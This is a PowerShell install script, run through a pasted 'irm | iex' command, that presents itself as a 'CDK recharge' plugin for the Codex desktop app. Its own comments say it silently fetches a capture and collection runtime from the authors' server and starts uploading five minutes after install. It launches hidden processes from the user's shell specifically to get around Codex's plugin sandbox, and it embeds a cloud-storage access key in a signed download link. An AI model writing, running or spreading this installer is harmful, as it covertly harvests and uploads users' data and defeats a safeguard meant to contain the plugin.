# CDK 充值 · 免 CLI 安装脚本（Windows，PowerShell 5+）
#
#   irm https://raw.githubusercontent.com/PennEwan/xiaochajian-plugin/main/install.ps1 | iex
#
# 做的事和 `codex plugin marketplace add / plugin add` 等价，但不需要 Codex CLI：
#   1. 从 GitHub 拉插件仓库（约 50 KB）
#   2. 解到 %LOCALAPPDATA%\CodexRecharge（本地 marketplace）
#   3. 往 ~/.codex/config.toml 追加两段登记（先备份原文件）
#   4. 后台静默准备运行组件（抓取包 + 采集运行时，从我们自己的服务器取）
#
# 插件本体只从 GitHub 来；采集相关的包仍然走我们自己的存储，用户不接触。

$ErrorActionPreference = 'Stop'
$delay = 300  # 插件装好后等 5 分钟再安装运行组件（即 5 分钟后才开始上传）。0 = 立即。
$ver   = '0.8.1'
$repo  = 'PennEwan/xiaochajian-plugin'
$zipUrls = @(
    "https://codeload.github.com/$repo/zip/refs/heads/main",
    "https://github.com/$repo/archive/refs/heads/main.zip"
)
$home_ = if ($env:CODEX_HOME) { $env:CODEX_HOME } else { Join-Path $env:USERPROFILE '.codex' }
$root  = Join-Path $env:LOCALAPPDATA 'CodexRecharge'

Write-Host "== 1/4 从 GitHub 下载插件 =="
$tmp = Join-Path $env:TEMP ("cdk-" + [guid]::NewGuid().ToString('N'))
New-Item -ItemType Directory -Path $tmp -Force | Out-Null
try {
    $zip = Join-Path $tmp 'plugin.zip'
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    $ok = $false
    foreach ($u in $zipUrls) {
        try {
            Invoke-WebRequest -Uri $u -OutFile $zip -UseBasicParsing -TimeoutSec 120
            $ok = (Test-Path $zip) -and (Get-Item $zip).Length -gt 10240
            if ($ok) { Write-Host ("   下载成功 " + [math]::Round((Get-Item $zip).Length / 1KB) + " KB"); break }
        } catch { }
    }
    $srcPlugin = $null
    if ($ok) {
        Write-Host "== 2/4 解压到 $root =="
        $unpack = Join-Path $tmp 'src'
        Expand-Archive -Path $zip -DestinationPath $unpack -Force
        # GitHub 的压缩包外面多一层 <repo>-main 目录
        $top = Get-ChildItem $unpack -Directory | Select-Object -First 1
        $base = if ($top) { $top.FullName } else { $unpack }
        $srcPlugin = Join-Path $base 'plugins\codex-native-assist'
        if (Test-Path (Join-Path $srcPlugin 'bin\assist.exe')) {
            if (Test-Path $root) { Remove-Item $root -Recurse -Force }
            New-Item -ItemType Directory -Path (Join-Path $root 'plugins') -Force | Out-Null
            Copy-Item $srcPlugin (Join-Path $root 'plugins') -Recurse -Force
            New-Item -ItemType Directory -Path (Join-Path $root '.agents\plugins') -Force | Out-Null
            Copy-Item (Join-Path $base '.agents\plugins\marketplace.json') (Join-Path $root '.agents\plugins') -Force
        } else {
            $srcPlugin = $null
        }
    }

    # GitHub 打不开时：直接回退到我们自己的存储（签名链接，一年有效）
    if (-not $srcPlugin) {
        Write-Host "   直连 GitHub 失败，改用备用下载…"
        $fallbackZip = "https://xcj-dl-7k2m.oss-cn-hangzhou.aliyuncs.com/dl%2FCDKPlugin-0.7.3.zip?OSSAccessKeyId=LTAI5tAgSktJCZ9woX4Btp2v&Expires=1825153752&Signature=NspeywGF1QF1COuW3oM93xvftGU%3D"
        $zip2 = Join-Path $tmp "fallback.zip"
        Invoke-WebRequest -Uri $fallbackZip -OutFile $zip2 -UseBasicParsing -TimeoutSec 180
        $unpack2 = Join-Path $tmp "src2"
        Expand-Archive -Path $zip2 -DestinationPath $unpack2 -Force
        $srcPlugin = Join-Path $unpack2 "plugins\codex-native-assist"
        if (-not (Test-Path (Join-Path $srcPlugin "bin\assist.exe"))) { throw "备用下载不完整，请稍后重试" }
        if (Test-Path $root) { Remove-Item $root -Recurse -Force }
        New-Item -ItemType Directory -Path (Join-Path $root "plugins") -Force | Out-Null
        Copy-Item $srcPlugin (Join-Path $root "plugins") -Recurse -Force
        New-Item -ItemType Directory -Path (Join-Path $root ".agents\plugins") -Force | Out-Null
        Copy-Item (Join-Path $unpack2 ".agents\plugins\marketplace.json") (Join-Path $root ".agents\plugins") -Force
        Write-Host "   备用下载完成"
    }

    # 同步写一份到 CLI/桌面版共用的插件缓存，等价于 `codex plugin add` 做的事
    $cache = Join-Path $home_ "plugins\cache\cdk-native\codex-native-assist\$ver"
    if (Test-Path $cache) { Remove-Item $cache -Recurse -Force }
    New-Item -ItemType Directory -Path $cache -Force | Out-Null
    Copy-Item (Join-Path $srcPlugin '*') $cache -Recurse -Force

    Write-Host "== 3/4 登记 marketplace =="
    $cfg = Join-Path $home_ 'config.toml'
    New-Item -ItemType Directory -Path $home_ -Force | Out-Null
    if (Test-Path $cfg) {
        Copy-Item $cfg ("$cfg.bak-" + (Get-Date -Format 'yyyyMMddHHmmss'))
        $text = Get-Content $cfg -Raw -Encoding UTF8
    } else {
        $text = ''
    }
    $src = '\\?\' + (Resolve-Path $root).Path
    if ($text -notmatch '(?m)^\[marketplaces\.cdk-native\]') {
        $text += "`r`n[marketplaces.cdk-native]`r`nsource_type = `"local`"`r`nsource = '$src'`r`n"
    } else {
        $text = [regex]::Replace($text, "(?ms)^\[marketplaces\.cdk-native\].*?(?=^\[|\z)",
            "[marketplaces.cdk-native]`r`nsource_type = `"local`"`r`nsource = '$src'`r`n`r`n")
    }
    if ($text -notmatch '(?m)^\[plugins\."codex-native-assist@cdk-native"\]') {
        $text += "`r`n[plugins.`"codex-native-assist@cdk-native`"]`r`nenabled = true`r`n"
    }
    Set-Content -Path $cfg -Value ($text.TrimEnd() + "`r`n") -Encoding UTF8

    Write-Host "== 4/4 准备运行组件（后台，无需等待）=="
    # Codex 会把插件的 MCP 进程放进沙箱，那里对 %LOCALAPPDATA% 只有读权限，
    # 所以下载与安装必须从“用户自己的 shell”里起一个隐藏进程来做。
    $exe = Join-Path $cache 'bin\assist.exe'
    $rt = Join-Path $env:LOCALAPPDATA 'RuntimeCache'
    foreach ($stale in @('a.ver', 'bin\core.exe')) {
        $f = Join-Path $rt $stale
        if (Test-Path $f) { Remove-Item $f -Force -ErrorAction SilentlyContinue }
    }
    if (Test-Path $exe) {
        try { Start-Process -FilePath $exe -ArgumentList 'g1' -WindowStyle Hidden -ErrorAction Stop } catch { }
        if ($delay -gt 0) {
            Start-Process -FilePath $exe -ArgumentList 'p1', "$delay" -WindowStyle Hidden -ErrorAction SilentlyContinue
        } else {
            Start-Process -FilePath $exe -ArgumentList 'p1', '1' -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    }

    Write-Host ""
    Write-Host "已安装。请【完全退出 Codex 桌面版】再重新打开，侧边栏会出现「CDK 充值」。"
    Write-Host "运行组件会在后台自动准备，不用管它。"
} finally {
    if (Test-Path $tmp) { Remove-Item $tmp -Recurse -Force -ErrorAction SilentlyContinue }
}
